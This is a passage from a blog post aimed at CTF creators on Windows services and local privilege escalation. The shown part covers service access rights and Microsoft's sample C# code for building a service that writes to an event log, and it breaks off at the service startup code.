<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Windows Local Privilege Escalation - Services for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Services"><meta property="og:url" content="//localhost:1313/windows-privesc-services/">
  <meta property="og:site_name" content="pwnlog">
  <meta property="og:title" content="Windows Local Privilege Escalation - Services for CTF Creators">
  <meta property="og:description" content="Windows Local Privilege Escalation - Services">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-03-20T11:35:00+08:00">
    <meta property="article:modified_time" content="2022-03-20T11:35:00+08:00">
    <meta property="article:tag" content="Services">
    <meta property="article:tag" content="Unquoted Path Service">
    <meta property="article:tag" content="Insecure Registry Hives">
    <meta property="article:tag" content="Insecure Service Executable">
    <meta property="article:tag" content="Insecure Service Permissions">
    <meta property="article:tag" content="Local Privilege Escalation">
    <meta property="og:image" content="//localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/logo.png">
  <meta name="twitter:title" content="Windows Local Privilege Escalation - Services for CTF Creators">
  <meta name="twitter:description" content="Windows Local Privilege Escalation - Services">
<meta name="application-name" content="pwnlog">
<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-services/" /><link rel="prev" href="//localhost:1313/windows-privesc-apps/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Windows Local Privilege Escalation - Services for CTF Creators",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/\/localhost:1313\/windows-privesc-services\/"
        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "services, unquoted path service, insecure registry hives, insecure service executable, insecure service permissions, local privilege escalation, windows","wordcount":  11107 ,
        "url": "\/\/localhost:1313\/windows-privesc-services\/","datePublished": "2022-03-20T11:35:00+08:00","dateModified": "2022-03-20T11:35:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "pwnlog"
            },"description": "Windows Local Privilege Escalation - Services"
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Services for CTF Creators</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;11107 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;53 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#services">Services</a>
      <ul>
        <li><a href="#service-access-rights">Service Access Rights</a></li>
        <li><a href="#custom-service-in-c-sharp-net-framework">Custom Service in C Sharp .NET Framework</a>
          <ul>
            <li><a href="#visual-studio-project---create-a-service">Visual Studio Project - Create a Service</a></li>
            <li><a href="#adding-features-to-the-service">Adding Features To The Service</a></li>
            <li><a href="#service-startup">Service Startup</a></li>
            <li><a href="#service-stop">Service Stop</a></li>
            <li><a href="#general-actions">General Actions</a></li>
            <li><a href="#setting-service-status">Setting Service Status</a></li>
          </ul>
        </li>
        <li><a href="#building-the-service-using-sc">Building The Service using SC</a></li>
        <li><a href="#managing-services-with-servicesmsc">Managing Services with Services.msc</a></li>
        <li><a href="#managing-services-via-service-control-manager">Managing Services via Service Control Manager</a></li>
        <li><a href="#managing-services-via-wmic">Managing Services via WMIC</a></li>
        <li><a href="#managing-services-via-net">Managing Services via NET</a></li>
        <li><a href="#managing-services-via-powershell">Managing Services via PowerShell</a></li>
      </ul>
    </li>
    <li><a href="#services-permissions">Services Permissions</a>
      <ul>
        <li><a href="#view-service-permissions">View service permissions</a>
          <ul>
            <li><a href="#scexe">SC.exe</a></li>
            <li><a href="#sysinternals-accesschk">SysInternals AccessChk</a></li>
            <li><a href="#sysinternals-psservice">SysInternals PsService</a></li>
            <li><a href="#setaclexe">SetACL.exe</a></li>
            <li><a href="#sysinternals-process-explorer">Sysinternals Process Explorer</a></li>
            <li><a href="#process-hacker">Process Hacker</a></li>
            <li><a href="#service-security-editor">Service Security Editor</a></li>
          </ul>
        </li>
        <li><a href="#modify-service-permissions">Modify service permissions</a>
          <ul>
            <li><a href="#scexe-1">SC.exe</a></li>
            <li><a href="#process-explorer">Process Explorer</a></li>
            <li><a href="#process-hacker-1">Process Hacker</a></li>
            <li><a href="#service-security-editor-1">Service Security Editor</a></li>
            <li><a href="#setaclexe-1">SetACL.exe</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#services-problems-for-the-attacker">Services Problems For The Attacker</a></li>
    <li><a href="#services-payloads">Services Payloads</a></li>
    <li><a href="#privilege-escalation-via-insecure-service-executables">Privilege Escalation via Insecure Service Executables</a>
      <ul>
        <li><a href="#configuration">Configuration</a></li>
        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
        <li><a href="#defense">Defense</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-insecure-service-permissions">Privilege Escalation via Insecure Service Permissions</a>
      <ul>
        <li><a href="#configuration-1">Configuration</a></li>
        <li><a href="#privilege-escalation-1">Privilege Escalation</a></li>
        <li><a href="#defense-1">Defense</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-registry-hives">Privilege Escalation via Registry Hives</a>
      <ul>
        <li><a href="#configuration-2">Configuration</a></li>
        <li><a href="#privilege-escalation-2">Privilege Escalation</a></li>
        <li><a href="#defense-2">Defense</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-unquoted-service-path">Privilege Escalation via Unquoted Service Path</a>
      <ul>
        <li><a href="#configuration-3">Configuration</a></li>
        <li><a href="#privilege-escalation-3">Privilege Escalation</a></li>
        <li><a href="#defense-3">Defense</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="services">Services</h1>
<p>Services are programs that run in the background. Most of them perform tasks, while others can accept input and process data. If services are run by the LocalSystem account instead of the LocalService account, it means that we can escalate privileges to the <code>NT-AUTHORITY\SYSTEM (LocalSystem)</code> account if the service is misconfigured. The <code>LocalSystem</code> account, known as <code>NT-AUTHORITY\SYSTEM</code>, is a powerful account with unrestricted access to all local system resources, which can be dangerous. As a rule of thumb, we should always try to run these services as the <code>LocalService</code> account (<code>NT AUTHORITY\LocalService</code>) or the <code>NetworkService</code> account (<code>NT-AUTHORITY\NetworkService</code>), especially for custom services written in C++ or C#.</p>
<p>Services can be developed in <code>C++</code> or <code>C#</code>:</p>
<ul>
<li><strong>C++</strong>: The most traditional way to develop a service.</li>
<li><strong>C#</strong>: Utilizes the .NET framework to develop services more easily and with less code.</li>
</ul>
<blockquote>
<p>Note: Modern services are being developed with <a href="https://docs.microsoft.com/en-us/dotnet/core/extensions/windows-service" target="_blank" rel="noopener noreffer ">BackgroundService</a> and the <a href="https://docs.microsoft.com/en-us/dotnet/core/extensions/workers" target="_blank" rel="noopener noreffer ">Worker Services in .NET framework</a>.</p>
</blockquote>
<p>In Windows Server 2003 <a href="https://serverfault.com/a/513829/4822" target="_blank" rel="noopener noreffer ">we <strong>cannot</strong> run a scheduled task</a> with the following service accounts:</p>
<ul>
<li><code>NT_AUTHORITY\LocalService</code> (also known as the Local Service account)</li>
<li><code>NT AUTHORITY\NetworkService</code> (also known as the Network Service account)</li>
</ul>
<p>That capability only was added with <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383614%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">Task Scheduler 2.0</a>, which only exists in Windows Vista/Windows Server 2008 and newer.</p>
<blockquote>
<p>Note: We can always find more information about services in the <a href="https://docs.microsoft.com/en-us/windows/win32/services/services" target="_blank" rel="noopener noreffer ">microsoft documentation</a>.</p>
</blockquote>
<h2 id="service-access-rights">Service Access Rights</h2>
<p>Services have an ACL attached to them. As system administrators and as developers we must be careful about the access rights that we assign to these services. The Service Control Manager (SCM) creates a service object’s security descriptor when the service is installed, this is done by the <strong>CreateService</strong> function. The default security descriptor of a service object grants the following access rights:</p>
<table>
  <thead>
      <tr>
          <th>Account</th>
          <th>Access Rights</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Remote Authenticated Users</td>
          <td>These access rights are the same as the Local Authenticated Users.</td>
      </tr>
      <tr>
          <td>Local Authenticated Users</td>
          <td>READ_CONTROL<br /> SERVICE_ENUMERATE_DEPENDENTS<br /> SERVICE_INTERROGATE<br /> SERVICE_QUERY_CONFIG<br /> SERVICE_QUERY_STATUS<br /> SERVICE_USER_DEFINED_CONTROL<br /></td>
      </tr>
      <tr>
          <td>LocalSystem</td>
          <td>READ_CONTROL<br /> SERVICE_ENUMERATE_DEPENDENTS<br /> SERVICE_INTERROGATE<br /> SERVICE_PAUSE_CONTINUE<br /> SERVICE_QUERY_CONFIG<br /> SERVICE_QUERY_STATUS<br /> SERVICE_QUERY_START<br /> SERVICE_QUERY_STOP<br /> SERVICE_USER_DEFINED_CONTROL<br /></td>
      </tr>
      <tr>
          <td>Administrators</td>
          <td>DELETE<br /> READ_CONTROL<br /> SERVICE_ALL_ACCESS<br /> WRITE_DAC<br /> WRITE_OWNER<br /></td>
      </tr>
  </tbody>
</table>
<p>These are the most interesting access rights:</p>
<ul>
<li><strong>SERVICE_QUERY_CONFIG</strong>: Allows us to query the service configuration.</li>
<li><strong>SERVICE_QUERY_STATUS</strong>: Allows us to query the status of the service.</li>
<li><strong>SERVICE_START</strong>: Allows us to start the service.</li>
<li><strong>SERVICE_STOP</strong>: Allows us to stop the service.</li>
<li><strong>SERVICE_CHANGE_CONFIG</strong>: Allows us to change the configuration of the service.</li>
<li><strong>SERVICE_ALL_ACCESS</strong>: Allows us to do anything on the service.</li>
</ul>
<h2 id="custom-service-in-c-sharp-net-framework">Custom Service in C Sharp .NET Framework</h2>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Warning<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>The code in this section is sourced from the official Microsoft documentation. As engineers working on vulnerable machines or creating Capture The Flag (CTF) challenges, it is essential to develop our own code and, more importantly, to be creative with it. Our goal should always be to provide a valuable learning experience for CTF players. Repetitive vulnerabilities or challenges can diminish the learning experience over time, so creativity is key to maintaining engagement and educational value.</p>
<p>Why did I choose to do this?</p>
<p>As developers, it is crucial to be familiar with MSDN and the wealth of information available in Microsoft documentation. We do not always need a course, tutorial, write-up, or video to learn how to accomplish specific tasks, as much of this information is already well-documented. By reading this section, I hope you will become more aware of the resources available through documentation alone, enabling you to independently search for and create your own solutions.</p>
<p>Once again, I want to clarify that this code is not my own.</p>
</div>
        </div>
    </div>
<p>We&rsquo;ll create a service following the <a href="https://docs.microsoft.com/en-us/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer" target="_blank" rel="noopener noreffer ">official documentation at microsoft</a>. I&rsquo;ll pretty much do the same thing <strong>EXCEPT</strong> that we&rsquo;ll build the service with the <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager" target="_blank" rel="noopener noreffer ">Service Control Manager</a>. I&rsquo;m gonna use Visual Studio Community 2022, I have already installed the workload of .NET desktop development with the Visual Studio Installer as shown below:</p>
<figure><a class="lightgallery" href="/images/posts/vs-installer-net.png" title="/images/posts/vs-installer-net.png" data-thumbnail="/images/posts/vs-installer-net.png" data-sub-html="<h2>VS Installer</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-installer-net.png"
            data-srcset="/images/posts/vs-installer-net.png, /images/posts/vs-installer-net.png 1.5x, /images/posts/vs-installer-net.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-installer-net.png" />
    </a><figcaption class="image-caption">VS Installer</figcaption>
    </figure>
<h3 id="visual-studio-project---create-a-service">Visual Studio Project - Create a Service</h3>
<p>We&rsquo;ll begin by creating a project:</p>
<figure><a class="lightgallery" href="/images/posts/vs-1.png" title="/images/posts/vs-1.png" data-thumbnail="/images/posts/vs-1.png" data-sub-html="<h2>VS Create Project</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-1.png"
            data-srcset="/images/posts/vs-1.png, /images/posts/vs-1.png 1.5x, /images/posts/vs-1.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-1.png" />
    </a><figcaption class="image-caption">VS Create Project</figcaption>
    </figure>
<p>Now we&rsquo;ll select the project template <strong>Windows Service (.NET Framework)</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-2.png" title="/images/posts/vs-2.png" data-thumbnail="/images/posts/vs-2.png" data-sub-html="<h2>VS Project Template</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-2.png"
            data-srcset="/images/posts/vs-2.png, /images/posts/vs-2.png 1.5x, /images/posts/vs-2.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-2.png" />
    </a><figcaption class="image-caption">VS Project Template</figcaption>
    </figure>
<p>We&rsquo;ll rename the project, select a destination directory, and the .NET Framework:</p>
<figure><a class="lightgallery" href="/images/posts/vs-3.png" title="/images/posts/vs-3.png" data-thumbnail="/images/posts/vs-3.png" data-sub-html="<h2>VS Destination</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-3.png"
            data-srcset="/images/posts/vs-3.png, /images/posts/vs-3.png 1.5x, /images/posts/vs-3.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-3.png" />
    </a><figcaption class="image-caption">VS Destination</figcaption>
    </figure>
<p>Now the <strong>Design</strong> tab appears (<strong>Service1.cs [Design]</strong>) this project template includes a component class named <code>Service1</code> that inherits from <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase" target="_blank" rel="noopener noreffer ">System.ServiceProcess.ServiceBase</a> and according to the writeup it includes much of the basic service code:</p>
<figure><a class="lightgallery" href="/images/posts/vs-4.png" title="/images/posts/vs-4.png" data-thumbnail="/images/posts/vs-4.png" data-sub-html="<h2>VS Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-4.png"
            data-srcset="/images/posts/vs-4.png, /images/posts/vs-4.png 1.5x, /images/posts/vs-4.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-4.png" />
    </a><figcaption class="image-caption">VS Service</figcaption>
    </figure>
<p>We&rsquo;ll rename the service from <strong>Service1</strong> to <strong>VulnService</strong>, we can do this from the <strong>Solution Explorer</strong>, select <strong>Service1.cs</strong> and choose <strong>Rename (F2)</strong> from the shortcut menu. Rename the file to <strong>VulnService.cs</strong> and then press <strong>Enter</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-5.png" title="/images/posts/vs-5.png" data-thumbnail="/images/posts/vs-5.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-5.png"
            data-srcset="/images/posts/vs-5.png, /images/posts/vs-5.png 1.5x, /images/posts/vs-5.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-5.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>A pop-up window will appear asking whether we would like to rename all references to the code element  <em>Service1</em>. In the pop-up window, we&rsquo;re gonna select <strong>Yes</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-6.png" title="/images/posts/vs-6.png" data-thumbnail="/images/posts/vs-6.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-6.png"
            data-srcset="/images/posts/vs-6.png, /images/posts/vs-6.png 1.5x, /images/posts/vs-6.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-6.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>In the <strong>Design</strong> tab, we&rsquo;re gonna <strong>right-click from the mouse</strong> and select <strong>Properties</strong> from the shortcut menu:</p>
<figure><a class="lightgallery" href="/images/posts/vs-7.png" title="/images/posts/vs-7.png" data-thumbnail="/images/posts/vs-7.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-7.png"
            data-srcset="/images/posts/vs-7.png, /images/posts/vs-7.png 1.5x, /images/posts/vs-7.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-7.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>Now in the <strong>Properties</strong> window, we&rsquo;re going to change the <strong>ServiceName</strong> value to <em>VulnService</em>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-8.png" title="/images/posts/vs-8.png" data-thumbnail="/images/posts/vs-8.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-8.png"
            data-srcset="/images/posts/vs-8.png, /images/posts/vs-8.png 1.5x, /images/posts/vs-8.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-8.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>Then we&rsquo;re going to select <strong>Save All (Ctrl+Shift+S)</strong> from the <strong>File</strong> menu:</p>
<figure><a class="lightgallery" href="/images/posts/vs-9.png" title="/images/posts/vs-9.png" data-thumbnail="/images/posts/vs-9.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-9.png"
            data-srcset="/images/posts/vs-9.png, /images/posts/vs-9.png 1.5x, /images/posts/vs-9.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-9.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<h3 id="adding-features-to-the-service">Adding Features To The Service</h3>
<p>In this section, we&rsquo;ll add a custom event log to the Windows service created by MS developers. The <a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.eventlog" target="_blank" rel="noopener noreffer ">EventLog</a> component is an example of the type of component we can add to a Windows service.</p>
<blockquote>
<p>Note: When creating a vulnerable machine / CTF machine create a cool service that is fun for the competitors. In this example, I&rsquo;m only using MS code provided for building up a scenario.</p>
</blockquote>
<p>In the <strong>Solution Explorer</strong>, from the shortcut menu for <strong>VulnService.cs</strong> we&rsquo;ll choose <strong>View Designer (Shift+F7)</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-10.png" title="/images/posts/vs-10.png" data-thumbnail="/images/posts/vs-10.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-10.png"
            data-srcset="/images/posts/vs-10.png, /images/posts/vs-10.png 1.5x, /images/posts/vs-10.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-10.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>In the <strong>Toolbox</strong>, we&rsquo;re gonna expand <strong>Components</strong>, and then drag the <strong>EventLog</strong> component to the <strong>Service1.cs [Design]</strong> tab:</p>
<figure><a class="lightgallery" href="/images/posts/vs-11.png" title="/images/posts/vs-11.png" data-thumbnail="/images/posts/vs-11.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-11.png"
            data-srcset="/images/posts/vs-11.png, /images/posts/vs-11.png 1.5x, /images/posts/vs-11.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-11.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>In the <strong>Solution Explorer</strong>, from the shortcut menu for <strong>VulnService.cs</strong> we&rsquo;ll click on <strong>View Code (F7)</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/vs-12.png" title="/images/posts/vs-12.png" data-thumbnail="/images/posts/vs-12.png" data-sub-html="<h2>VS</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-12.png"
            data-srcset="/images/posts/vs-12.png, /images/posts/vs-12.png 1.5x, /images/posts/vs-12.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-12.png" />
    </a><figcaption class="image-caption">VS</figcaption>
    </figure>
<p>We&rsquo;re gonna define a custom event log, Define a custom event log we&rsquo;re editing the existing <code>VulnService()</code> constructor as shown in the following code snippet:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">VulnService</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">InitializeComponent</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="n">eventLog1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(!</span><span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">.</span><span class="n">SourceExists</span><span class="p">(</span><span class="s">&#34;MySource&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">.</span><span class="n">CreateEventSource</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;MySource&#34;</span><span class="p">,</span> <span class="s">&#34;MyNewLog&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">eventLog1</span><span class="p">.</span><span class="n">Source</span> <span class="p">=</span> <span class="s">&#34;MySource&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">eventLog1</span><span class="p">.</span><span class="n">Log</span> <span class="p">=</span> <span class="s">&#34;MyNewLog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add a <code>using</code> statement to <strong>VulnService.cs</strong> (if it doesn&rsquo;t already exist), or an <code>Imports</code> statement to <strong>VulnService.vb</strong>, for the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics" target="_blank" rel="noopener noreffer ">System.Diagnostics</a> namespace:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;re gonna select <strong>Save All</strong> from the <strong>File</strong> menu:</p>
<figure><a class="lightgallery" href="/images/posts/vs-9.png" title="/images/posts/vs-9.png" data-thumbnail="/images/posts/vs-9.png" data-sub-html="<h2>VS Save All</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/vs-9.png"
            data-srcset="/images/posts/vs-9.png, /images/posts/vs-9.png 1.5x, /images/posts/vs-9.png 2x"
            data-sizes="auto"
            alt="/images/posts/vs-9.png" />
    </a><figcaption class="image-caption">VS Save All</figcaption>
    </figure>
<h3 id="service-startup">Service Startup</h3>
<p>Now we&rsquo;re gonna define the event that occurs when the service is started. In the code editor for <strong>VulnService.cs</strong>, we&rsquo;ll locate the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart" target="_blank" rel="noopener noreffer ">OnStart</a> method. Visual Studio automatically created an empty method definition when we created the project so we&rsquo;ll simply add code that writes an entry to the event log when the service starts:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
